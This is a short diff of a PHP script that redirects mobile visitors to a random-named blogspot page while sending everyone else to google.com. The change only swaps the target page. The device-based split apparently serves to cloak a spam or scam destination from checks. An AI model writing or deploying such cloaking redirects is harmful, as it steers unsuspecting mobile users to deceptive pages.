@@ -10,7 +10,7 @@ $ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
 if ($iphone || $android || $palmpre || $ipod || $berry == true) 
  {
  
-  header('Location: https://mostrandomelo-linkdo.blogspot.com/');
+  header('Location: https://mientraleintratelompo.blogspot.com/');
      
   }else{
  header('Location: https://google.com/');
